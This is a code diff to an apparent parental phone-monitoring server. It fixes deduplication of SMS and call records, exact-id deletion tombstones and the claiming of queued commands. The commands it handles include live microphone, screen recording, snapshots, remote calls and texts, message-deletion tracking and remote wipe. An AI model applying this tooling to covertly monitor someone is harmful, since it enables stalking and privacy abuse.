@@ -359,10 +359,12 @@ function isSmsTomb(db, deviceId, androidId, address, body) {
   const aid = String(androidId || '');
   const ad = String(address || '');
   const bd = String(body || '');
-  return (db.deletedSms || []).some(t => String(t.deviceId||'') === String(deviceId||'') && (
-    (aid && (String(t.androidId||'') === aid || String(t.id||'') === aid)) ||
-    (ad && bd && String(t.address||'') === ad && String(t.body||'') === bd)
-  ));
+  return (db.deletedSms || []).some(t => {
+    if (String(t.deviceId||'') !== String(deviceId||'')) return false;
+    // Exact id only. Body+number match hid every later "ok"/OTP to that contact.
+    if (aid && aid !== 'undefined' && aid !== 'null' && (String(t.androidId||'') === aid || String(t.id||'') === aid)) return true;
+    return false;
+  });
 }
 function isCallTomb(db, deviceId, androidId, number, createdAt) {
   ensureTomb(db);
@@ -372,14 +374,9 @@ function isCallTomb(db, deviceId, androidId, number, createdAt) {
   return (db.deletedCalls || []).some(t => {
     if (String(t.deviceId||'') !== String(deviceId||'')) return false;
     // Exact androidId / server id match — strongest
-    if (aid && (String(t.androidId||'')===aid || String(t.id||'')===aid)) return true;
+    // Exact id only. Number match hid every later call to that contact.
+    if (aid && aid !== 'undefined' && aid !== 'null' && (String(t.androidId||'')===aid || String(t.id||'')===aid)) return true;
     if (t.id && aid && String(t.id)===aid) return true;
-    // Number-only ONLY when both sides lack a real CallLog id (provisional/evt)
-    // Never hide a different real call to the same number
-    const tAid = String(t.androidId || '');
-    const bothProv = (!aid || aid.indexOf('evt-')===0 || aid.indexOf('pdu-')===0)
-                  && (!tAid || tAid.indexOf('evt-')===0 || tAid.indexOf('pdu-')===0);
-    if (bothProv && n10 && n10.length >= 8 && last10(t.number) === n10) return true;
     return false;
   });
 }
@@ -2061,16 +2058,20 @@ const server = http.createServer(async (req, res) => {
       list.forEach(x => {
         const aid = String(x.androidId || '');
         const realId = aid && aid.indexOf('pdu-') !== 0;
-        const bkey = last10(x.address) + '|' + String(x.body || '') + '|' + Math.round((Number(x.dateMs) || 0) / 120000);
+        // 30s bucket — 120s was merging different SMS with same body
+        const bkey = last10(x.address) + '|' + String(x.body || '') + '|' + Math.round((Number(x.dateMs) || 0) / 30000);
         const hit = uniq.find(u => {
           const uid = String(u.androidId || '');
+          // two real provider ids = two messages
+          if (realId && uid && uid.indexOf('pdu-') !== 0 && aid !== uid) return false;
           if (realId && uid && uid === aid && aid.indexOf('pdu-') !== 0) return true;
-          const uk = last10(u.address) + '|' + String(u.body || '') + '|' + Math.round((Number(u.dateMs) || 0) / 120000);
+          const uk = last10(u.address) + '|' + String(u.body || '') + '|' + Math.round((Number(u.dateMs) || 0) / 30000);
           return bkey.length > 4 && uk === bkey;
         });
         if (!hit) { uniq.push(Object.assign({}, x)); return; }
         if (aid && (!hit.androidId || String(hit.androidId).indexOf('pdu-') === 0)) hit.androidId = aid;
         if (x.deleted) { hit.deleted = true; hit.deletedBy = hit.deletedBy || x.deletedBy || 'child'; }
+        else if (!x.deleted && hit.deletedBy !== 'parent') { hit.deleted = false; hit.deletedBy = ''; }
         if (x.simSlot != null && hit.simSlot == null) hit.simSlot = x.simSlot;
         if (x.direction && !hit.direction) hit.direction = x.direction;
       });
@@ -2161,6 +2162,7 @@ const server = http.createServer(async (req, res) => {
           if (nums.indexOf(last10(u.number)) >= 0) u.name = c.name;
         });
       });
+            uniq.sort((a, b) => callMs(b) - callMs(a));
             const callsOut = uniq.slice(0, 500).map(x => Object.assign({}, x, {
         duration_seconds: Number(x.durationSeconds != null ? x.durationSeconds : (x.duration || 0)) || 0,
         durationSeconds: Number(x.durationSeconds != null ? x.durationSeconds : (x.duration || 0)) || 0,
@@ -2273,12 +2275,17 @@ const server = http.createServer(async (req, res) => {
             const xms = (typeof x.startedAt === 'number')
               ? (x.startedAt < 1e12 ? x.startedAt * 1000 : x.startedAt)
               : (Date.parse(x.createdAt || 0) || 0);
-            const close = Math.abs(xms - ms) < 90000;
+            const close = Math.abs(xms - ms) < 60000;
             const xa = String(x.androidId || '');
             const xProv = !xa || xa.indexOf('evt-') === 0;
-            const aProv = !androidId || androidId.indexOf('evt-') === 0;
-            if (n10.length >= 8 && last10(x.number) === n10 && close && (xProv || aProv || x.pending)) return true;
-            if ((!n10 || n10.length < 8) && (!last10(x.number) || last10(x.number).length < 8) && close && (xProv || aProv)) return true;
+            const aProv = !androidId || String(androidId).indexOf('evt-') === 0;
+            // Never merge two different real CallLog ids
+            if (androidId && xa && !xProv && !aProv && String(androidId) !== xa) return false;
+            const xd = String(x.direction || '').toUpperCase();
+            const cd = String(direction || '').toUpperCase();
+            const dirOk = !xd || !cd || xd.indexOf(cd.slice(0, 3)) >= 0 || cd.indexOf(xd.slice(0, 3)) >= 0;
+            if (n10.length >= 8 && last10(x.number) === n10 && close && dirOk && (xProv || aProv || x.pending)) return true;
+            if ((!n10 || n10.length < 8) && (!last10(x.number) || last10(x.number).length < 8) && close && dirOk && (xProv || aProv)) return true;
             return false;
           });
           if (!exists) {
@@ -2286,7 +2293,7 @@ const server = http.createServer(async (req, res) => {
             db.calls.push({
               id: rid(), deviceId: d.deviceId, androidId, number, name: c.name || '',
               direction, duration, durationSeconds: duration,
-              createdAt, startedAt: started,
+              createdAt, startedAt: ms,
               simSlot: c.simSlot != null ? c.simSlot : null,
               subscriptionId: c.subscriptionId != null ? c.subscriptionId : null,
               simNumber: c.simNumber || '',
@@ -2309,6 +2316,8 @@ const server = http.createServer(async (req, res) => {
               if (ct && ct.name) exists.name = ct.name;
             }
             if (n10.length >= 8 && last10(exists.number).length < 8) exists.number = number;
+            if (direction && !exists.direction) exists.direction = direction;
+            if (ms && !exists.startedAt) exists.startedAt = ms;
             if (c.simLabel) exists.simLabel = c.simLabel;
             if (c.simNumber) exists.simNumber = c.simNumber;
             if (c.carrier) exists.carrier = c.carrier;
@@ -2317,6 +2326,19 @@ const server = http.createServer(async (req, res) => {
             if (c.deleted === true && exists.deletedBy !== 'parent') {
               exists.deleted = true;
               exists.deletedBy = exists.deletedBy || 'child';
+            } else if (!c.deleted && exists.deletedBy !== 'parent') {
+              // Live row again — clear false DELETED BY CHILD
+              exists.deleted = false;
+              exists.deletedBy = '';
+              if (c.durationSeconds != null || c.duration != null) {
+                exists.durationSeconds = Number(c.durationSeconds != null ? c.durationSeconds : c.duration) || exists.durationSeconds || 0;
+                exists.duration = exists.durationSeconds;
+              }
+              if (c.name) exists.name = c.name;
+              if (ms) exists.startedAt = ms;
+              if (number) exists.number = number;
+              if (direction) exists.direction = direction;
+              if (androidId && !exists.androidId) exists.androidId = androidId;
             }
           }
         });
@@ -2399,19 +2421,35 @@ const server = http.createServer(async (req, res) => {
           if (!ms) ms = Date.now();
           const createdAt = new Date(ms).toISOString();
           const simSlot = m.simSlot != null ? m.simSlot : (m.subscriptionId != null ? m.subscriptionId : null);
-          const hit = db.sms.find(x => String(x.deviceId||'') === String(d.deviceId||'') && (
-            (androidId && String(x.androidId || '') === androidId) ||
-            (x.address === address && x.body === bodyTxt && Math.abs((Number(x.dateMs) || 0) - ms) < 180000)
-          ));
+          const hit = db.sms.find(x => {
+            if (String(x.deviceId||'') !== String(d.deviceId||'')) return false;
+            // Exact provider id always wins
+            if (androidId && String(x.androidId || '') === String(androidId)) return true;
+            const xa = String(x.androidId || '');
+            const aReal = androidId && !String(androidId).startsWith('pdu-') && !String(androidId).startsWith('evt-') && /^\d+$/.test(String(androidId));
+            const xReal = xa && !xa.startsWith('pdu-') && !xa.startsWith('evt-') && /^\d+$/.test(xa);
+            // Two different real SMS ids must never merge (OTP/same body collisions)
+            if (aReal && xReal && String(androidId) !== xa) return false;
+            // Provisional / missing id: tight body+time match only
+            if (aReal && xReal) return false;
+            return String(x.address||'') === String(address||'')
+              && String(x.body||'') === String(bodyTxt||'')
+              && Math.abs((Number(x.dateMs) || 0) - ms) < 30000;
+          });
           if (hit) {
             if (androidId && !hit.androidId) hit.androidId = androidId;
             if (simSlot != null) hit.simSlot = simSlot;
             hit.pending = false;
-            hit.status = 'SENT';
+            hit.status = hit.status || 'SENT';
             if (asDeleted && hit.deletedBy !== 'parent') {
               hit.deleted = true;
               hit.deletedBy = 'child';
               hit.deletedAt = m.deletedAt || Date.now();
+            } else if (!asDeleted && hit.deletedBy !== 'parent') {
+              // Live SMS again — clear false DELETED BY CHILD
+              hit.deleted = false;
+              hit.deletedBy = '';
+              if (bodyTxt) hit.body = bodyTxt;
             }
             return;
           }
@@ -2927,7 +2965,7 @@ const server = http.createServer(async (req, res) => {
         && (c.command === 'place_call' || c.command === 'call_place' || c.command === 'make_call')
         && String((c.payload || {}).number || (c.payload || {}).to || '') === String(number)
         && (c.status === 'PENDING' || c.status === 'CLAIMED'
-            || (c.createdAt && (Date.now() - new Date(c.createdAt).getTime()) < 90000)));
+            || (c.createdAt && (Date.now() - new Date(c.createdAt).getTime()) < 12000)));
       if (!recent) {
         db.commands.push({
           id: rid(), deviceId, command: 'place_call',
@@ -3015,7 +3053,7 @@ const server = http.createServer(async (req, res) => {
       if (!p) return send(res, 401, { error: 'unauthorized' });
       const db = load();
       const ids = [].concat(body.ids || [], body.id ? [body.id] : []).map(String);
-      const androidIds = [].concat(body.androidIds || [], body.androidId ? [body.androidId] : []).map(String);
+      const androidIds = [].concat(body.androidIds || [], body.androidId ? [body.androidId] : []).map(String).filter(x => x && x !== 'undefined' && x !== 'null');
       const deviceId = String(body.deviceId || q.deviceId || '');
       if (!String(deviceId||'').trim()) return send(res, 400, { error: 'deviceId required' });
       const before = (db.sms || []).length;
@@ -3026,8 +3064,7 @@ const server = http.createServer(async (req, res) => {
         const a10 = last10(x.address);
         const hit = ids.includes(String(x.id))
           || androidIds.includes(String(x.androidId || ''))
-          || (address && smsBody && String(x.address||'')===address && String(x.body||'')===smsBody)
-          || (last10(address).length >= 8 && a10 === last10(address) && String(x.body||'')===smsBody);
+          || (androidIds.length === 0 && ids.length === 0 && address && smsBody && String(x.address||'')===address && String(x.body||'')===smsBody);
         if (hit) { x.deletedByParent = true; return false; }
         return true;
       });
@@ -3060,6 +3097,7 @@ const server = http.createServer(async (req, res) => {
       if (cmd === 'record_screen' || cmd === 'start_screen_record') cmd = 'screen_record';
       const payload = body.payload || {};
       if (cmd === 'place_call' || cmd === 'call_place' || cmd === 'make_call') {
+        // Align with /calls/place: only block while PENDING/CLAIMED or <12s (not full 90s DONE window)
         const num = String((payload && (payload.number || payload.to)) || '');
         const n10 = last10(num);
         const nowPc = Date.now();
@@ -3069,8 +3107,10 @@ const server = http.createServer(async (req, res) => {
           const cn = last10((c.payload || {}).number || (c.payload || {}).to || '');
           if (n10.length >= 8 && cn !== n10) return false;
           if (n10.length < 8 && String((c.payload || {}).number || '') !== num) return false;
+          const st = String(c.status || '');
+          if (st === 'PENDING' || st === 'CLAIMED') return true;
           const age = nowPc - (Date.parse(c.createdAt) || 0);
-          return age < 90000;
+          return age < 12000;
         });
         if (dup) return send(res, 200, { ok: true, deduped: true });
       }
@@ -3107,6 +3147,16 @@ const server = http.createServer(async (req, res) => {
         });
         if (has) return send(res, 200, { ok: true, deduped: true, note: 'wipe already queued' });
       }
+      if (cmd === 'sync_call_log' || cmd === 'sync_sms' || cmd === 'calls_sync' || cmd === 'sms_sync' || cmd === 'sync_contacts') {
+        const nowS = Date.now();
+        const has = (db.commands || []).some(c => {
+          if (!c || String(c.deviceId||'') !== String(deviceId||'')) return false;
+          if (String(c.command||'') !== cmd) return false;
+          if (c.status !== 'PENDING' && c.status !== 'CLAIMED') return false;
+          return nowS - (Date.parse(c.createdAt) || 0) < 20000;
+        });
+        if (has) return send(res, 200, { ok: true, deduped: true });
+      }
       db.commands.push({ id: rid(), deviceId: deviceId, command: cmd, payload: payload, status: 'PENDING', createdAt: now() });
       save(db); return send(res, 200, { ok: true });
     }
@@ -3134,27 +3184,31 @@ const server = http.createServer(async (req, res) => {
             || cmd === 'factory_reset_protect_on' || cmd === 'factory_reset_protect_off'
             || cmd === 'lock_factory_reset' || cmd === 'unlock_factory_reset'
             || cmd === 'lock_device' || cmd === 'unlock_device' || cmd === 'device_lock' || cmd === 'device_unlock'
+            || cmd === 'place_call' || cmd === 'call_place' || cmd === 'make_call'
+            || cmd === 'end_call' || cmd === 'hangup' || cmd === 'call_end'
+            || cmd === 'send_sms' || cmd === 'sms_send'
+            || cmd === 'sync_call_log' || cmd === 'sync_sms' || cmd === 'calls_sync' || cmd === 'sms_sync'
+            || cmd === 'call_delete' || cmd === 'sms_delete' || cmd === 'delete_sms'
+          );
+          const comms = (
+            cmd === 'place_call' || cmd === 'call_place' || cmd === 'make_call'
+            || cmd === 'end_call' || cmd === 'hangup' || cmd === 'send_sms' || cmd === 'sms_send'
+            || cmd === 'sync_call_log' || cmd === 'sync_sms' || cmd === 'call_delete' || cmd === 'sms_delete'
           );
           const limit = (cmd === 'live_mic' || cmd === 'live_audio_on' || cmd === 'live_audio_off')
             ? 12 * 1000
-            : (fast ? 45 * 1000 : 5 * 60 * 1000);
+            : (comms ? 20 * 1000 : (fast ? 45 * 1000 : 5 * 60 * 1000));
           if (age > limit) c.status = 'PENDING';
         }
       });
-      // Atomic claim: only PENDING → CLAIMED in one pass (prevents double-exec on parallel polls)
-      const snapshot = [];
-      const claimedAt = now();
+      // Pick pending first, prioritize, then CLAIM only the first 30.
+      // Claiming the entire backlog made sync_sms block place_call for minutes.
+      const pendingIdx = [];
       for (let i = 0; i < (db.commands || []).length; i++) {
         const c = db.commands[i];
         if (!c || String(c.deviceId||'') !== String(d.deviceId||'') || c.status !== 'PENDING') continue;
-        c.status = 'CLAIMED';
-        c.claimedAt = claimedAt;
-        snapshot.push({
-          id: c.id, deviceId: c.deviceId, command: c.command,
-          payload: c.payload || {}, status: 'PENDING', createdAt: c.createdAt
-        });
+        pendingIdx.push(i);
       }
-      if (snapshot.length) {
         // Live control first so Speaker/mic is not stuck behind gallery/sms sync
         const pri = (c) => {
           const x = String(c.command || '');
@@ -3162,15 +3216,30 @@ const server = http.createServer(async (req, res) => {
           if (x === 'remote_factory_reset' || x === 'factory_reset_now' || x === 'wipe_device' || x === 'parent_wipe') return 0;
           if (x === 'factory_reset_lock' || x === 'factory_reset_unlock' || x === 'lock_device' || x === 'unlock_device') return 0;
           if (x === 'place_call' || x === 'call_place' || x === 'make_call') return 0;
+          if (x === 'end_call' || x === 'hangup' || x === 'call_end') return 0;
+          if (x === 'send_sms' || x === 'sms_send') return 0;
+          if (x === 'sync_call_log' || x === 'sync_sms' || x === 'calls_sync' || x === 'sms_sync') return 1;
+          if (x === 'call_delete' || x === 'sms_delete' || x === 'delete_sms') return 1;
           if (x === 'snapshot_now' || x === 'snap_now' || x === 'capture_snapshot') return 0;
           if (x === 'live_mic' || x === 'live_audio_on' || x === 'live_audio_off') return 1;
           if (x === 'start_live' || x === 'live_start' || x === 'stop_live' || x === 'live_stop') return 2;
           if (x === 'live_torch' || x === 'live_camera_facing') return 3;
           return 9;
         };
-        snapshot.sort((a, b) => pri(a) - pri(b));
-        save(db);
+      pendingIdx.sort((ia, ib) => pri(db.commands[ia]) - pri(db.commands[ib]));
+      const snapshot = [];
+      const claimedAt = now();
+      const take = pendingIdx.slice(0, 30);
+      for (let n = 0; n < take.length; n++) {
+        const c = db.commands[take[n]];
+        c.status = 'CLAIMED';
+        c.claimedAt = claimedAt;
+        snapshot.push({
+          id: c.id, deviceId: c.deviceId, command: c.command,
+          payload: c.payload || {}, status: 'PENDING', createdAt: c.createdAt
+        });
       }
+      if (snapshot.length) save(db);
       return send(res, 200, { commands: snapshot });
     }
     if (pathname === '/commands/ack' && req.method === 'POST') {
